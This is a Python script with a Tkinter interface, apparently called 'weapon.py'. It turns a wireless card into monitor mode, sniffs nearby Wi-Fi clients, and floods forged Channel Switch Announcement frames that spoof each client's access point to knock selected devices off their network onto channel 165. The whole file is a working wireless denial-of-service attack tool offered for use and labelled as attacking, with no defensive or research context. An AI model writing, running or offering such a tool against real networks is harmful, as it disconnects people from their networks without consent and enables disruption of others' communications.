import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class SurgicalWeaponV5_1:
    def __init__(self, iface):
        self.iface = iface
        self.clients = {}  
        self.active_attacks = set()
        self.current_chan = 1
        self.stop_hopper = False
        
        self.prepare_hardware()
        
        self.root = tk.Tk()
        self.root.title("CSA Logic v5.1 + Auto-Scanner")
        self.root.geometry("700x550")
        self.root.configure(bg="#050505")

        self.listbox = tk.Listbox(self.root, selectmode='multiple', bg="#111", fg="#00FF41", font=("Courier", 10), height=18)
        self.listbox.pack(padx=10, pady=10, fill="both", expand=True)

        self.status_bar = tk.Label(self.root, text="Scanning Channels...", bg="#111", fg="#00FF41", anchor="w")
        self.status_bar.pack(fill="x", side="bottom")

        btn_frame = tk.Frame(self.root, bg="#050505")
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="STEER (KICK)", command=self.start_steer, bg="#AA0000", fg="white", width=15).pack(side="left", padx=5)
        tk.Button(btn_frame, text="RESTORE (PULL)", command=self.restore_client, bg="#0055FF", fg="white", width=15).pack(side="left", padx=5)

        # Start Logic Threads
        threading.Thread(target=self.channel_hopper, daemon=True).start()
        threading.Thread(target=self.discovery_engine, daemon=True).start()

    def prepare_hardware(self):
        os.system(f"sudo airmon-ng check kill")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def channel_hopper(self):
        # Logic: Cycle through 2.4GHz channels (1-13)
        # You can add 5GHz channels to this list if your card supports it
        channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
        while True:
            if not self.stop_hopper:
                for ch in channels:
                    if self.stop_hopper: break
                    os.system(f"sudo iw dev {self.iface} set channel {ch}")
                    self.current_chan = ch
                    self.status_bar.config(text=f"[*] Scanning Channel: {ch}")
                    time.sleep(0.5)
            else:
                time.sleep(1)

    def discovery_engine(self):
        def handler(pkt):
            if pkt.haslayer(Dot11) and pkt.type == 2:
                c, b = pkt.addr2, pkt.addr3
                if b and c and c != b and c != "ff:ff:ff:ff:ff:ff":
                    if c not in self.clients:
                        self.clients[c] = {"BSSID": b, "Channel": self.current_chan}
                        self.root.after(0, self.refresh_ui)
        sniff(iface=self.iface, prn=handler, store=0)

    def create_csa_frame(self, client_mac, bssid, channel):
        dot11 = Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)
        # CSA Information Element: New Channel + Count 0 (Now)
        csa_payload = b"\x00\x04\x25\x03\x01" + bytes([channel]) + b"\x00"
        return RadioTap()/dot11/Dot11Action()/csa_payload

    def start_steer(self):
        # Lock logic: Stop hopping to focus on the attack channel
        self.stop_hopper = True
        for i in self.listbox.curselection():
            mac = list(self.clients.keys())[i]
            data = self.clients[mac]
            
            # Set card to target's channel specifically
            os.system(f"sudo iw dev {self.iface} set channel {data['Channel']}")
            self.status_bar.config(text=f"[!] LOCKED ON CHANNEL {data['Channel']} - ATTACKING")
            
            pkt = self.create_csa_frame(mac, data["BSSID"], 165)
            self.active_attacks.add(mac)
            
            def attack_loop():
                while mac in self.active_attacks:
                    sendp(pkt, iface=self.iface, verbose=False, count=5)
                    time.sleep(1)
            
            threading.Thread(target=attack_loop, daemon=True).start()
        self.refresh_ui()

    def restore_client(self):
        # Logic: Unlock hopper and bring them back
        self.stop_hopper = False
        for i in self.listbox.curselection():
            mac = list(self.clients.keys())[i]
            if mac in self.active_attacks:
                self.active_attacks.remove(mac)
                data = self.clients[mac]
                restore_pkt = self.create_csa_frame(mac, data["BSSID"], data["Channel"])
                sendp(restore_pkt, count=20, iface=self.iface, verbose=False)
        self.refresh_ui()

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, info in self.clients.items():
            status = " [STEERING...] " if mac in self.active_attacks else " [STABLE] "
            self.listbox.insert(tk.END, f"{status} {mac} | AP: {info['BSSID']} | CH: {info['Channel']}")

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 weapon.py [interface]")
    else: SurgicalWeaponV5_1(sys.argv[1]).root.mainloop()
